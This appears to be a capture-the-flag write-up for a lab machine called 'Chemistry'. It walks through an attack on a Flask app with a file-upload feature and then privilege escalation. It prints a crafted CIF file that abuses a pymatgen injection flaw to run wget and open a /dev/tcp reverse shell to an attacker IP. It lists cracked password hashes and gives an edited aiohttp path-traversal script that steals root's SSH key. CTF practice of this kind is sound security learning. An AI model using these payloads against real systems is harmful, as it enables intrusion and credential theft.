# Chemistry

## Nmap

<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

We see we have 2 ports open ssh and a flask aplication on port 5000

## Site enumeration

I log in and test out the file upload section. After some googling I find i is vulnerable to [cif ACI](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f).

```
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system("wget 10.10.14.25:9000");0,0,0'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.25/9000 0>&1\'");0,0,0'
_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "

```

The above cif file gives us a revserse shell!!

## Remote shell

I upload linpeas.sh and run a scan

<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

After some googling I relaise this is an exploit ive used already in the blunder miflin retired box! Lets run it again. Anddd it is not that simple :(

Looking around at the files we find a database in the instance folder and inside we find some hashed passwords.

Lets crack:

3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5 -> unicorniosrosados

6|carlos|9ad48828b0955513f7cf0f7f6510c8f8 -> carlos123&#x20;

7|peter|6845c17d298d95aa942127bdad2ceb9b  -> peterparker

8|victoria|c3601ad2286a4293868ec2a4bc606ba3 -> victoria123

## Ssh session

Now lets ssh as rosa with that pasword we found and we get the user flag!

Usinf netsat we can find an open port as 8080 with is a python/3.9 aiohttp/3.9.1 server after some googling we can find an [exploit](https://raw.githubusercontent.com/z3rObyte/CVE-2024-23334-PoC/refs/heads/main/exploit.sh).

We have to do some manual edditing here to get the roots ssh key. I was stuck on this for an incredibly long time I initially copied the key from the terminal and tried to use that. But it got rejected over and over again because it was not in the right format eventuall i changed the script to download the file and sshed into the root account from the rosa account see edited code:

```
!/bin/bash

url="http://localhost:8080"
string="../"
payload="/assets/"
file="root/.ssh/id_rsa" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $url$payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is --output key.pem "$url$payload$file" 
        break
    fi
done

```

We can insert a reverse shell and get root!!

PWNDDDD
